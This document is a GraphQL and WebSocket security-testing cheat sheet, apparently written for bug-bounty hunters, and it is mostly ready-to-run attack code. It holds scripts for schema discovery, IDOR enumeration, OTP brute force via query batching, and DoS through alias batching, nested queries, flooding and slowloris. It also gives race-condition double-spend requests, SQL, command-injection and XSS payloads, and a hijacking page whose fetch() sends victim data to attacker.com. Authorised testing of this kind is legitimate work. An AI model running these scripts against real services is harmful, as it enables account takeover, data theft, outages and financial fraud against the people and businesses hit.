# GraphQL & WebSocket Security Testing

## Part 1: GraphQL Testing

### Discovery

```bash
# Common GraphQL endpoints
GQL_PATHS=(
    "/graphql" "/gql" "/api/graphql" "/api/gql"
    "/v1/graphql" "/v2/graphql"
    "/graphql/v1" "/graphql/v2"
    "/query" "/api/query"
    "/graphql/console" "/graphql/playground"
    "/graphiql" "/altair"
    "/explorer" "/api/explorer"
    "/gquery"  # LINE WORKS/Lua-based (non-standard)
)

# IMPORTANT: Also look for GraphQL under region/path prefixes
# Enterprise services often hide GraphQL behind prefixes:
# /jp1/gquery, /kr1/graphql, /api/v2/graphql, /internal/graphql
# If a host has region prefixes (discovered via gobuster), test GraphQL on EACH prefix.

for path in "${GQL_PATHS[@]}"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        -X POST "https://$TARGET$path" \
        -H "Content-Type: application/json" \
        -d '{"query":"{ __typename }"}')
    [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

# Detect GraphQL from error messages
# Send invalid query — GraphQL returns specific error format:
curl -sk -X POST "https://$TARGET/api" \
    -H "Content-Type: application/json" \
    -d '{"query":"{"}'
# GraphQL error: {"errors":[{"message":"Syntax Error...","locations":[...]}]}

# GET-based GraphQL (some implementations)
curl -sk "https://$TARGET/graphql?query=%7B__typename%7D"

# Check for GraphQL via WebSocket (subscriptions)
# ws://target/graphql or wss://target/graphql
# Protocol: graphql-ws or graphql-transport-ws
```

### Introspection Attacks

```bash
# Full schema introspection query
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields(includeDeprecated: true) { name description args { name description type { name kind ofType { name kind } } } type { name kind ofType { name kind ofType { name kind ofType { name } } } } } inputFields { name description type { name kind ofType { name kind } } } enumValues(includeDeprecated: true) { name description } } directives { name description locations args { name description type { name kind ofType { name kind } } } } } }"}' | python3 -m json.tool

# Shorter introspection (types and fields only)
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' | jq '.data.__schema.types[] | select(.name | startswith("__") | not)'

# List all queries
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { fields { name description args { name type { name } } } } } }"}' | jq '.data.__schema.queryType.fields[]'

# List all mutations
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { mutationType { fields { name description args { name type { name kind ofType { name } } } } } } }"}' | jq '.data.__schema.mutationType.fields[]'
```

### Introspection Disabled — Bypass Techniques

```bash
# 1. Field suggestion exploitation
# Send a query with a typo — some implementations suggest valid field names
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ usre { id } }"}'
# Response: "Did you mean 'user'?"

# Automate field discovery via suggestions:
WORDLIST=("user" "users" "account" "accounts" "admin" "profile" "order" "orders" "payment" "transaction" "transfer" "balance" "card" "notification" "message" "setting" "config" "token" "session" "login" "register" "password" "otp" "verify" "bank" "beneficiary" "statement")

for word in "${WORDLIST[@]}"; do
    RESPONSE=$(curl -sk -X POST "https://$TARGET/graphql" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"{ ${word}XXXXX { id } }\"}" 2>/dev/null)
    SUGGESTIONS=$(echo "$RESPONSE" | grep -o "Did you mean.*" | head -1)
    [ -n "$SUGGESTIONS" ] && echo "$word → $SUGGESTIONS"
done

# 2. __type query (sometimes allowed when __schema is blocked)
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}'

# 3. Try introspection via GET (may bypass POST-only restrictions)
curl -sk "https://$TARGET/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# 4. Try with different Content-Type
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'query={ __schema { types { name } } }'
```

### Authorization Testing

```bash
# Per-field authorization bypass
# If you can query your own user, try accessing fields meant for admins:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ me { id email role isAdmin internalNotes creditScore riskRating } }"}'

# Nested object access (traverse relationships)
# user → orders → otherUser's orders
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id: \"OTHER_USER_ID\") { id email orders { id amount status } } }"}'

# Mutation without proper auth
# Try admin mutations with regular user token:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { updateUserRole(userId: \"MY_ID\", role: ADMIN) { id role } }"}'

# Access control on connections/edges
# Pagination may leak total count or items from other users:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ allTransactions(first: 100) { totalCount edges { node { id amount userId } } } }"}'
```

### IDOR via GraphQL

```bash
# Node interface (Relay specification)
# Global IDs are base64-encoded: base64("TypeName:id")
echo -n "User:1" | base64  # VXNlcjox
echo -n "User:2" | base64  # VXNlcjoy

# Query other users via node interface:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ node(id: \"VXNlcjoy\") { ... on User { id email balance } } }"}'

# Enumerate IDs:
for i in $(seq 1 100); do
    ID=$(echo -n "User:$i" | base64)
    RESULT=$(curl -sk -X POST "https://$TARGET/graphql" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"{ node(id: \\\"$ID\\\") { ... on User { id email } } }\"}" | jq -r '.data.node.email // empty')
    [ -n "$RESULT" ] && echo "User:$i → $RESULT"
done

# Direct ID parameter:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ account(id: \"OTHER_ACCOUNT_ID\") { balance transactions { amount } } }"}'
```

### Query Batching (Brute Force Bypass)

```bash
# Send multiple queries in one request to bypass rate limiting
# Useful for: OTP brute force, user enumeration, password spraying

# Array batching:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '[
        {"query":"mutation { login(phone: \"+62812xxx\", otp: \"000001\") { token } }"},
        {"query":"mutation { login(phone: \"+62812xxx\", otp: \"000002\") { token } }"},
        {"query":"mutation { login(phone: \"+62812xxx\", otp: \"000003\") { token } }"},
        {"query":"mutation { login(phone: \"+62812xxx\", otp: \"000004\") { token } }"},
        {"query":"mutation { login(phone: \"+62812xxx\", otp: \"000005\") { token } }"}
    ]'
# 5 OTP attempts in 1 request — rate limiter may count as 1 request

# Alias batching (single query, multiple operations):
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { a1: login(otp: \"000001\") { token } a2: login(otp: \"000002\") { token } a3: login(otp: \"000003\") { token } a4: login(otp: \"000004\") { token } a5: login(otp: \"000005\") { token } }"}'

# Generate batch for full OTP brute force:
python3 -c "
import json
queries = []
for i in range(0, 1000000, 100):
    batch = []
    for j in range(100):
        otp = f'{i+j:06d}'
        batch.append({'query': f'mutation {{ a{j}: login(otp: \"{otp}\") {{ token }} }}'})
    # Send batch...
    print(f'Batch {i//100}: OTPs {i:06d}-{i+99:06d}')
" | head -20
```

### Alias Batching DoS (Proven Pattern — LINE WORKS June 2026)

Alias batching isn't just for rate-limit bypass — it's a standalone DoS vector when the server lacks query complexity limits. Unlike nested queries (which many GraphQL libraries block by default), alias limits are rarely enforced.

**Exploitation methodology:**

```python
#!/usr/bin/env python3
"""GraphQL Alias Batching DoS — Escalation Measurement"""
import requests, time, urllib3
urllib3.disable_warnings()

TARGET = "https://TARGET/graphql"
HEADERS = {"Content-Type": "application/json"}

def build_query(n):
    """Pick a cheap resolver (read-only, no auth needed)."""
    q = "{ "
    for i in range(n):
        q += f'a{i}: __typename '  # Or any accessible field
    q += "}"
    return q

# Step 1: Baseline
start = time.time()
r = requests.post(TARGET, json={"query": "{ __typename }"}, headers=HEADERS, verify=False, timeout=10)
baseline = time.time() - start
print(f"Baseline: {baseline:.3f}s")

# Step 2: Escalation curve (proves linear amplification)
for count in [10, 50, 100, 200, 500, 1000]:
    q = build_query(count)
    start = time.time()
    try:
        r = requests.post(TARGET, json={"query": q}, headers=HEADERS, verify=False, timeout=60)
        elapsed = time.time() - start
        print(f"{count:>5} aliases: {elapsed:.3f}s | {len(r.text):>7} bytes | {r.status_code}")
    except requests.exceptions.ReadTimeout:
        print(f"{count:>5} aliases: TIMEOUT (>{time.time()-start:.0f}s) — DoS confirmed")
        break

# Step 3: Rate limit check
codes = []
start = time.time()
for _ in range(20):
    r = requests.post(TARGET, json={"query": "{ __typename }"}, headers=HEADERS, verify=False, timeout=5)
    codes.append(r.status_code)
print(f"Rate limit: {'NONE' if all(c==200 for c in codes) else 'DETECTED'} ({time.time()-start:.1f}s for 20 req)")
```

**What makes it reportable (not just "theoretical DoS"):**
- Linear time amplification measured (500 aliases = 37x baseline)
- Server timeout or extreme degradation at 1000+ aliases
- No rate limiting (sustained rapid requests all succeed)
- No authentication required
- Single request causes multi-second server-side processing

**Real-world results (LINE WORKS, June 2026):**
| Aliases | Time | Response Size |
|---------|------|---------------|
| 1 | 0.15s | 79 bytes |
| 100 | 2.4s | 13,901 bytes |
| 500 | 10.3s | 69,901 bytes |
| 1000 | 24.1s | 206,901 bytes |

**Key distinction:** Use the cheapest resolver available (even `__typename` works). The goal is proving the server processes N operations per request with no cap — the specific operation doesn't matter for the DoS itself.

**Reporting CWEs:** CWE-770 (Allocation Without Limits) + CWE-400 (Uncontrolled Resource Consumption). CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H).

**Program exclusion check:** Some programs exclude DoS. But this is NOT traditional DoS (flooding) — it's a single-request resource exhaustion. Still, check the exclusion list before spending time on the report.

---

### Pre-Auth Operation Classification (Auth Bypass Detection)

When GraphQL introspection reveals operations, classify each by auth behavior BEFORE reporting. Different operations may have different auth layers — some execute pre-auth while others check cookies/tokens.

**Methodology (LINE WORKS, June 2026):**

```bash
# Step 1: Get all operations with correct field types via introspection
curl -s -X POST "$GQL_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { fields { name args { name type { name kind ofType { name kind } } } } } } }"}' \
    | python3 -c "import sys,json; [print(f['name'], [(a['name'],a['type']) for a in f['args']]) for f in json.load(sys.stdin)['data']['__schema']['queryType']['fields']]"

# Step 2: For each operation, call with correct types but dummy values (NO auth headers/cookies)
# Step 3: Classify response into categories:
```

**Response classification table:**

| Response Pattern | Meaning | Auth Status |
|-----------------|---------|-------------|
| `{"message":"Cookie error"}` | Backend checks cookie FIRST | ❌ AUTH REQUIRED |
| `{"returnCode":"60","returnMessage":"PERMISSION_DENINED"}` | App-layer permission check (no cookie check) | ⚠️ PARTIAL BYPASS |
| `{"message":"ERR","result":{}}` | Operation executes, returns business logic error | ✅ NO AUTH |
| `{"error":"attempt to index field 'X' (a nil value)"}` | Server-side code (Lua/etc) RUNS pre-auth | ✅ CODE EXECUTION PRE-AUTH |
| `{"data":{}}` | Empty success, no error | ✅ SILENT SUCCESS |
| Timeout (>10s) | Server processes expensive operation | ✅ RESOURCE CONSUMPTION PRE-AUTH |

**Key insight:** "ERR" ≠ "blocked". If the error is a BUSINESS LOGIC error (invalid channel, user not found) rather than an AUTH error (cookie error, 401, token invalid), the operation EXECUTED without authentication. The auth layer was never checked.

**Proving write-operation auth bypass:**
```bash
# Use correct types from introspection (critical — wrong types give "Could not coerce" errors)
# batch_send_message: userNo=String, msgTid=Float, serviceId=String, content=String, domainId=Float
curl -s -X POST "$GQL_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ batch_send_message(userNo: \"1\", msgTid: 1, serviceId: \"test\", content: \"poc\", domainId: 1, channelNos: [1]) { result message error { channels { channelNo } } } }"}'
# Response: {"data":{"batch_send_message":{"message":"ERR","error":{"channels":[{"channelNo":1}]}}}}
# ↑ Backend PROCESSED the write request without any auth — returned per-channel status
```

**Severity escalation argument:**
- Introspection alone = Medium (schema disclosure)
- Pre-auth READ operations executing = Medium-High (broken access control)
- Pre-auth WRITE operations executing = High (even if business logic rejects invalid IDs, the auth boundary is absent — valid IDs obtained via other means would allow full exploitation)
- Pre-auth code execution (Lua errors) = High (server-side code runs for unauthenticated users)

**Pitfall — "no data leaked" dismissal:**
Programs may argue "no actual data was accessed." Counter-argument: the finding is MISSING AUTHENTICATION on write endpoints, not data leakage. If an attacker obtains valid internal IDs (via social engineering, OSINT, other vulls), they can send messages/join channels/forward messages without ANY authentication. The auth boundary simply doesn't exist on these operations.

**Type introspection tip (non-standard GraphQL):**
Some implementations (Lua-based like LINE WORKS) have non-standard type coercion. Always introspect with `ofType` to get the actual scalar:
```bash
curl -s -X POST "$GQL_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { fields { name args { name type { name kind ofType { name kind } } } } } } }"}' \
    | python3 -c "
import sys,json
d=json.load(sys.stdin)
for f in d['data']['__schema']['queryType']['fields']:
    print(f['name'])
    for a in f['args']:
        t = a['type']
        inner = t.get('ofType',{}).get('name','?') if t.get('ofType') else t.get('name','?')
        print(f'  {a[\"name\"]}: {t[\"kind\"]}({inner})')
"
```

---

### Nested Query DoS (Resource Exhaustion)

```bash
# Depth-based DoS (if no query depth limiting):
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id:\"1\") { friends { friends { friends { friends { friends { friends { friends { friends { friends { friends { name } } } } } } } } } } } }"}'

# Width-based DoS (many fields):
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ a1: users { id } a2: users { id } a3: users { id } a4: users { id } a5: users { id } a6: users { id } a7: users { id } a8: users { id } a9: users { id } a10: users { id } }"}'

# Fragment-based amplification:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"query { users { ...F1 } } fragment F1 on User { friends { ...F2 } } fragment F2 on User { friends { ...F3 } } fragment F3 on User { friends { id name email } }"}'

# Measure response time to detect depth/complexity limits:
for depth in 2 4 6 8 10 15 20; do
    NESTED=$(python3 -c "print('{ user ' + '{ friends ' * $depth + '{ id } ' + '} ' * $depth + '}')")
    TIME=$(curl -sk -X POST "https://$TARGET/graphql" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"$NESTED\"}" \
        -w "%{time_total}" -o /dev/null)
    echo "Depth $depth: ${TIME}s"
done
```

### Information Disclosure

```bash
# Verbose error messages
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id: \"invalid\") { nonexistentField } }"}'
# May reveal: field names, type names, resolver paths, stack traces

# Debug mode detection
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }","extensions":{"debug":true}}'

# Tracing (Apollo Server)
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -H "X-Apollo-Tracing: 1" \
    -d '{"query":"{ users { id } }"}'
# May return resolver execution times and paths
```

### GraphQL File Upload

```bash
# Multipart request specification (graphql-upload)
curl -sk -X POST "https://$TARGET/graphql" \
    -F 'operations={"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
    -F 'map={"0":["variables.file"]}' \
    -F '0=@malicious.svg'

# Test for:
# - Unrestricted file types (upload .html, .svg with XSS, .php)
# - Path traversal in filename
# - SSRF via URL-based upload
# - File size limits (DoS via large upload)
```

---

## Part 2: WebSocket Testing

### Discovery

```bash
# Common WebSocket endpoints
WS_PATHS=(
    "/ws" "/websocket" "/socket" "/realtime"
    "/ws/v1" "/api/ws" "/api/websocket"
    "/socket.io/" "/sockjs/"
    "/cable"  # ActionCable (Rails)
    "/hub"    # SignalR
    "/graphql" # GraphQL subscriptions
    "/notifications" "/events" "/stream"
    "/chat" "/live" "/feed"
)

# Check for WebSocket upgrade support
for path in "${WS_PATHS[@]}"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "Upgrade: websocket" \
        -H "Connection: Upgrade" \
        -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
        -H "Sec-WebSocket-Version: 13" \
        "https://$TARGET$path")
    # 101 = WebSocket upgrade successful
    # 400 = WebSocket endpoint but missing params
    # 426 = Upgrade Required (confirms WS support)
    [ "$STATUS" != "404" ] && [ "$STATUS" != "403" ] && echo "$path: $STATUS"
done

# Socket.IO detection (uses polling fallback)
curl -sk "https://$TARGET/socket.io/?EIO=4&transport=polling"
# Returns: 0{"sid":"...","upgrades":["websocket"],...}
```

### Tools Setup

```bash
# websocat (recommended — versatile)
brew install websocat
# Or: cargo install websocat

# wscat (Node.js)
npm install -g wscat

# Basic connection:
websocat "wss://$TARGET/ws" -H "Authorization: Bearer $TOKEN"
wscat -c "wss://$TARGET/ws" -H "Authorization: Bearer $TOKEN"
```

### Authentication Testing

```bash
# 1. Connect without any auth
websocat "wss://$TARGET/ws"
# If connection succeeds → missing auth (HIGH)

# 2. Token in URL (leaks via referrer, logs)
websocat "wss://$TARGET/ws?token=$JWT"
# Finding: token in URL = credential exposure risk

# 3. Auth only at connection time (not per-message)
# Connect with valid token, then:
# - Does the server validate token expiry on each message?
# - Can you keep using the connection after token expires?
# - Can you send messages after logout?

# 4. Missing origin validation (Cross-Site WebSocket Hijacking)
# Connect from different origin:
websocat "wss://$TARGET/ws" \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=$VICTIM_SESSION"
# If connection succeeds with evil origin → CSWSH vulnerability

# 5. Protocol-level auth bypass
# Some implementations check auth in HTTP upgrade but not in WS frames
websocat "wss://$TARGET/ws" -H "Authorization: Bearer invalid_token"
# If upgrade succeeds → auth not properly validated

# 6. Handshake manipulation for IP ban bypass
# If you get blocked during testing, manipulate handshake headers:
websocat "wss://$TARGET/ws" -H "X-Forwarded-For: 192.168.1.1"
websocat "wss://$TARGET/ws" -H "X-Forwarded-For: 127.0.0.1"
# Also try reconnecting with different Sec-WebSocket-Key
# Some apps use handshake session context for all subsequent messages
# → tamper with handshake cookies/headers to change user context
```

### Cross-Site WebSocket Hijacking (CSWSH)

```html
<!-- Proof of concept HTML page hosted on attacker domain -->
<script>
// If target doesn't validate Origin header, this works:
var ws = new WebSocket("wss://target.com/ws");
// Browser sends victim's cookies automatically!

ws.onopen = function() {
    // Subscribe to victim's notifications
    ws.send(JSON.stringify({action: "subscribe", channel: "user_notifications"}));
};

ws.onmessage = function(event) {
    // Exfiltrate received data
    fetch("https://attacker.com/collect", {
        method: "POST",
        body: event.data
    });
};
</script>
```

```bash
# Test CSWSH:
# 1. Check if Origin header is validated
websocat "wss://$TARGET/ws" -H "Origin: https://evil.com"
# If 403 → Origin validated (good)
# If 101 → No Origin check (CSWSH possible)

# 2. Check if cookies are sufficient for auth (no additional token needed)
websocat "wss://$TARGET/ws" -H "Cookie: session=$SESSION_COOKIE" -H "Origin: https://evil.com"
```

### Injection via WebSocket

```bash
# SQL injection in message parameters
websocat "wss://$TARGET/ws" <<< '{"action":"search","query":"test\" OR 1=1--"}'
websocat "wss://$TARGET/ws" <<< '{"action":"getUser","id":"1 UNION SELECT password FROM users--"}'

# Command injection
websocat "wss://$TARGET/ws" <<< '{"action":"ping","host":"127.0.0.1; id"}'
websocat "wss://$TARGET/ws" <<< '{"action":"export","filename":"report.pdf; cat /etc/passwd"}'

# XSS via WebSocket (if messages rendered in other users' browsers)
websocat "wss://$TARGET/ws" <<< '{"action":"sendMessage","text":"<img src=x onerror=alert(document.cookie)>"}'

# NoSQL injection
websocat "wss://$TARGET/ws" <<< '{"action":"find","filter":{"$gt":""}}'

# Template injection
websocat "wss://$TARGET/ws" <<< '{"action":"render","template":"{{7*7}}"}'
```

### Authorization Bypass

```bash
# 1. Subscribe to other users' channels
# Normal: subscribe to your own notifications
websocat "wss://$TARGET/ws" <<< '{"action":"subscribe","channel":"user_123_notifications"}'
# Attack: subscribe to another user's channel
websocat "wss://$TARGET/ws" <<< '{"action":"subscribe","channel":"user_456_notifications"}'
# If you receive their notifications → authorization bypass (HIGH)

# 2. Message manipulation (send as another user)
websocat "wss://$TARGET/ws" <<< '{"action":"sendMessage","from":"admin","to":"user","text":"Your OTP is 123456"}'

# 3. Admin actions via WebSocket
websocat "wss://$TARGET/ws" <<< '{"action":"admin.listUsers"}'
websocat "wss://$TARGET/ws" <<< '{"action":"admin.deleteUser","userId":"target"}'

# 4. Channel enumeration
for i in $(seq 1 100); do
    echo "{\"action\":\"subscribe\",\"channel\":\"user_${i}_balance\"}"
done | websocat "wss://$TARGET/ws"

# 5. Privilege escalation via message type
websocat "wss://$TARGET/ws" <<< '{"type":"admin","action":"getConfig"}'
websocat "wss://$TARGET/ws" <<< '{"role":"admin","action":"listSecrets"}'
```

### DoS via WebSocket

```bash
# 1. Message flooding (no rate limiting)
python3 -c "
import asyncio, websockets, json
async def flood():
    async with websockets.connect('wss://$TARGET/ws') as ws:
        for i in range(10000):
            await ws.send(json.dumps({'action':'ping','id':i}))
asyncio.run(flood())
"

# 2. Large frame attack
python3 -c "
import asyncio, websockets
async def large_frame():
    async with websockets.connect('wss://$TARGET/ws') as ws:
        await ws.send('A' * 10000000)  # 10MB message
asyncio.run(large_frame())
"

# 3. Connection exhaustion
# Open many WebSocket connections without closing:
for i in $(seq 1 1000); do
    websocat "wss://$TARGET/ws" --no-close &
done
# Check if server stops accepting new connections

# 4. Slowloris-style (send partial frames slowly)
python3 -c "
import socket, ssl, time
sock = socket.socket()
sock = ssl.wrap_socket(sock)
sock.connect(('$TARGET', 443))
# Send WebSocket upgrade
sock.send(b'GET /ws HTTP/1.1\r\nHost: $TARGET\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n')
# Read upgrade response
sock.recv(4096)
# Send partial frame, never complete it
while True:
    sock.send(b'\x81')  # Text frame, no length yet
    time.sleep(30)
"
```

### Socket.IO Specific Testing

```bash
# Socket.IO uses a specific protocol on top of WebSocket
# Handshake via polling first, then upgrades to WS

# 1. Get session ID
SID=$(curl -sk "https://$TARGET/socket.io/?EIO=4&transport=polling" | sed 's/^0//' | jq -r '.sid')
echo "Session: $SID"

# 2. Connect via WebSocket with SID
websocat "wss://$TARGET/socket.io/?EIO=4&transport=websocket&sid=$SID"
# Send: 2probe (ping)
# Expect: 3probe (pong)
# Send: 5 (upgrade)

# 3. Emit events
# Socket.IO message format: 4<event_id>[event_name, ...args]
# Example: 42["chat message","hello"]
websocat "wss://$TARGET/socket.io/?EIO=4&transport=websocket&sid=$SID" <<< '42["getBalance",{"userId":"OTHER_USER"}]'

# 4. Listen to all events (some servers broadcast too much)
# Just connect and log everything received
websocat "wss://$TARGET/socket.io/?EIO=4&transport=websocket&sid=$SID" | tee ws_log.txt
```

---

## Race Conditions (Bonus — Applies to Both)

### Turbo Intruder Pattern (Burp)

```python
# Turbo Intruder script for race conditions
# Use with Burp Suite's Turbo Intruder extension

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)

    # Queue same request multiple times for race condition
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # Open gate — all requests fire simultaneously
    engine.openGate('race1')
    engine.complete(timeout=10)

def handleResponse(req, interesting):
    table.add(req)
```

### Parallel curl for Race Conditions

```bash
# Double-spend test (financial transactions)
# Fire multiple identical transfer requests simultaneously:

# Method 1: GNU parallel
seq 1 10 | parallel -j10 "curl -sk -X POST 'https://$TARGET/api/v1/transfer' \
    -H 'Authorization: Bearer $TOKEN' \
    -H 'Content-Type: application/json' \
    -d '{\"to\":\"ACC123\",\"amount\":100}' \
    -w 'HTTP %{http_code} in %{time_total}s\n' -o /dev/null"

# Method 2: Background processes with sync
for i in $(seq 1 10); do
    curl -sk -X POST "https://$TARGET/api/v1/transfer" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"to":"ACC123","amount":100}' \
        -w "Request $i: HTTP %{http_code}\n" -o /dev/null &
done
wait

# Method 3: Python asyncio (most precise timing)
python3 << 'EOF'
import asyncio, aiohttp, json

async def race():
    url = f"https://{TARGET}/api/v1/transfer"
    headers = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
    data = json.dumps({"to": "ACC123", "amount": 100})

    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers, data=data, ssl=False) for _ in range(10)]
        responses = await asyncio.gather(*tasks)
        for i, resp in enumerate(responses):
            print(f"Request {i}: {resp.status}")

asyncio.run(race())
EOF

# What to check after race condition test:
# - Did balance decrease by 100 (correct) or 1000 (race condition)?
# - Were multiple transactions created?
# - Did any request get a different response code?
```

### Alias Batching: When It Works vs When It Doesn't

GraphQL alias batching (sending N copies of the same mutation with different aliases in a single request) is often cited as a race condition technique. However, it only works under specific server conditions:

| Server Architecture | Alias Batching Wins Race? | Why |
|---|---|---|
| Multi-threaded (Java/Spring, .NET) with DataLoader | YES | DataLoader batches and executes aliases in parallel threads |
| Multi-threaded without DataLoader | MAYBE | Server may still serialize mutations within a single request |
| Single-threaded (Node.js default) | NO | Event loop processes aliases sequentially within the request |
| Node.js with worker threads / cluster | MAYBE | Depends on whether aliases are dispatched to workers |
| Python (Django/Flask) with sync views | NO | GIL + synchronous processing = sequential execution |
| Python with async views (FastAPI) | MAYBE | Async may interleave but typically awaits each mutation |
| Go with goroutines per resolver | YES | Each alias resolver may spawn a goroutine |

**Key insight:** Alias batching is NOT equivalent to sending N separate HTTP requests simultaneously. Within a single GraphQL request, the server decides how to execute multiple aliases. Many servers serialize them.

**When to use alias batching:**
- Target uses Java/Spring GraphQL or Go with concurrent resolvers
- You've confirmed via timing that aliases execute in parallel (total time ≈ single mutation time, not N × single mutation time)
- The target uses DataLoader (check for `@defer`, `@stream` support as indicators)

**When to use HTTP/2 single-packet instead:**
- Target uses Node.js or Python (aliases likely sequential)
- You need guaranteed parallelism
- Alias batching timing shows sequential execution (total time ≈ N × single)

**Verification technique:**
```graphql
# Timing test: if this takes ~1x single mutation time, aliases are parallel
# If it takes ~5x, they're sequential
mutation RaceTest {
  a1: redeemCoupon(code: "TEST") { success }
  a2: redeemCoupon(code: "TEST") { success }
  a3: redeemCoupon(code: "TEST") { success }
  a4: redeemCoupon(code: "TEST") { success }
  a5: redeemCoupon(code: "TEST") { success }
}
```

```bash
# Compare timing
time curl -sk -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { a1: redeemCoupon(code: \"TEST\") { success } }"}'

# vs
time curl -sk -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { a1: redeemCoupon(code: \"TEST\") { success } a2: redeemCoupon(code: \"TEST\") { success } a3: redeemCoupon(code: \"TEST\") { success } a4: redeemCoupon(code: \"TEST\") { success } a5: redeemCoupon(code: \"TEST\") { success } }"}'

# If 5-alias request takes same time as 1-alias → parallel (use alias batching)
# If 5-alias request takes 5x longer → sequential (use HTTP/2 single-packet instead)
```

---

## Severity Guide

| Finding | Severity | Context |
|---------|----------|---------|
| GraphQL introspection enabled (prod) | Medium | Schema disclosure, aids further attacks |
| IDOR via GraphQL node/ID | High-Critical | Depends on data accessed |
| Batch query bypasses rate limiting on OTP | Critical | Account takeover via OTP brute force |
| Nested query DoS (no depth limit) | Medium | Service disruption |
| Alias batching DoS (no complexity limit) | Medium-High | Single-request resource exhaustion (check program exclusions — some exclude "DoS" broadly) |
| Mutation without authorization | Critical | Unauthorized data modification |
| Per-field auth bypass (admin fields accessible) | High | Privilege escalation |
| WebSocket missing authentication | High-Critical | Unauthorized data access |
| Cross-Site WebSocket Hijacking | High | Session hijacking from victim's browser |
| WebSocket channel authorization bypass | High | Access other users' real-time data |
| SQL injection via WebSocket | Critical | Database compromise |
| WebSocket no rate limiting | Low-Medium | DoS potential |
| Token in WebSocket URL | Low | Credential exposure in logs |
| Race condition on financial transaction | Critical | Double-spend, financial loss |
